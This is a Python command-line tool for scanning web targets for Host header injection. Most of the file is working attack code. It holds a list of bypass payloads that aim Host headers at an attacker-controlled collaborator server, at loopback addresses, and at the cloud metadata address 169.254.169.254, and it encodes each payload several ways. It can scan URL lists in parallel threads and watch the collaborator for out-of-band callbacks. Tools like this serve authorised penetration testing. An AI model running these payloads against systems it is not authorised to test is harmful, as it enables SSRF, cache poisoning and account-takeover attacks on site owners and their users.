#!/usr/bin/env python3

# Host Header Injection Scanner
# Author: Mike Masanga

import requests
import argparse
import concurrent.futures
import urllib3
import re
import sys
import random
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

PINK = "\033[95m"
RESET = "\033[0m"
BLUE = "\033[94m"

ascii_art = f"""
{PINK}
    ███╗   ███╗██╗██╗  ██╗███████╗
    ████╗ ████║██║██║ ██╔╝██╔════╝
    ██╔████╔██║██║█████╔╝ █████╗  
    ██║╚██╔╝██║██║██╔═██╗ ██╔══╝  
    ██║ ╚═╝ ██║██║██║  ██╗███████╗
    ╚═╝     ╚═╝╚═╝╚═╝  ╚══════╝

    👑 Created by Mike Masanga{RESET}
"""


BYPASS_PAYLOADS = [
    "{host} &@{collab}# @{collab}",
    "{host};.{collab}",
    "{host}:@{collab}",
    "{host}:443:@{collab}",
    "{host}:443@{collab}",
    "{host}:443#@{collab}",
    "{host}?@{collab}",
    "{host}%23{collab}",
    "{collab}\t{host}",
    "{collab}\n{host}",
    "{collab}\n{host}",
    "{collab}\u0000{host}",
    "{collab}\u0009{host}",
    "{collab}\u000b{host}",
    "{collab}\u000c{host}",
    "{collab}?=.{host}",
    "http://{collab}.{host}",
    "{collab}@@{host}",
    "127.0.0.1",
    "[::1]",
    "169.254.169.254",
    "localhost",
    "{collab}@{host}",
    "{collab}:443@{host}"
]

random.shuffle(BYPASS_PAYLOADS)

ENCODINGS = [
    lambda x: x,  # plain
    lambda x: x.encode('utf-8').hex(),  # hex
    lambda x: requests.utils.quote(x),  # URL-encoded
    lambda x: ''.join(['%{:02x}'.format(ord(c)) for c in x])  # percent hex
]

def extract_hostname(url):
    return re.sub(r"https?://(www\.)?", "", url).split("/")[0]

def scan_url(url, collab):
    print(f"[*] Scanning {url}")
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Connection': 'close'
    }
    results = []
    host = extract_hostname(url)

    try:
        init_resp = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
        cookies = init_resp.cookies.get_dict()
    except Exception as e:
        print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} Failed to fetch cookies from {url}: {str(e).splitlines()[0]}")
        cookies = {}

    for payload in BYPASS_PAYLOADS:
        target_host = payload.replace("{collab}", collab).replace("{host}", host)
        for encode in ENCODINGS:
            encoded_host = encode(target_host)
            try:
                headers['Host'] = encoded_host.encode('latin-1').decode('latin-1')
            except UnicodeEncodeError:
                print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} Skipping payload (encoding issue): {encoded_host}")
                continue
            try:
                resp = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                content_length = resp.headers.get("Content-Length", "Unknown")

                if resp.status_code in [200, 302, 403, 500]:
                    results.append((encoded_host, resp.status_code, content_length))
                    print(f"{Fore.RED}[POTENTIAL]{Style.RESET_ALL} Host: {Fore.YELLOW}{encoded_host}{Style.RESET_ALL} => Status: {resp.status_code} | Length: {content_length}")
                elif resp.status_code >= 400:
                    print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} Host: {encoded_host} => Status: {resp.status_code} | Length: {content_length}")
                else:
                    print(f"Host: {Fore.CYAN}{encoded_host}{Style.RESET_ALL} => Status: {resp.status_code} | Length: {content_length}")
            except requests.exceptions.ConnectionError:
                print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} {encoded_host} => No Response!")
            except Exception as e:
                print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} {encoded_host} => {str(e).splitlines()[0]}")
                continue

    return results

def main():
    print(ascii_art)
    parser = argparse.ArgumentParser(description="Host Header Injection Scanner with Bypass Techniques")
    parser.add_argument("-u", help="Scan a single URL")
    parser.add_argument("-list", help="File with list of URLs to scan")
    parser.add_argument("-collab", required=True, help="Your collaborator server to check for interactions")
    parser.add_argument("-threads", type=int, default=10, help="Number of threads to use (default: 10)")
    args = parser.parse_args()

    args.collab = args.collab.strip().replace("http://", "").replace("https://", "").strip("/")

    try:
        if not sys.stdin.isatty():
            urls = [line.strip() for line in sys.stdin if line.strip()]
        elif args.u:
            urls = [args.u.strip()]
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        else:
            parser.error("You must provide input through stdin, -u, or -list.")

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan_url, url, args.collab): url for url in urls}
            for future in concurrent.futures.as_completed(futures):
                url = futures[future]
                try:
                    result = future.result()
                    if result:
                        print(f"{Fore.RED}[+] Possible HHI on {url}{Style.RESET_ALL}")
                        for r in result:
                            print(f"{Fore.YELLOW}Host: {r[0]}{Style.RESET_ALL}")
                            print(f"{Fore.BLUE}    => Status: {r[1]} | Length: {r[2]}{Style.RESET_ALL}")

                except Exception as exc:
                    print(f"{Fore.MAGENTA}[-] Error scanning {url}: {exc}{Style.RESET_ALL}")

        print(f"{Fore.GREEN}[!] Scan complete. Check your collaborator server for any hits or DNS lookups.{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user.{Style.RESET_ALL}")
        sys.exit(1)
if __name__ == "__main__":
    main()
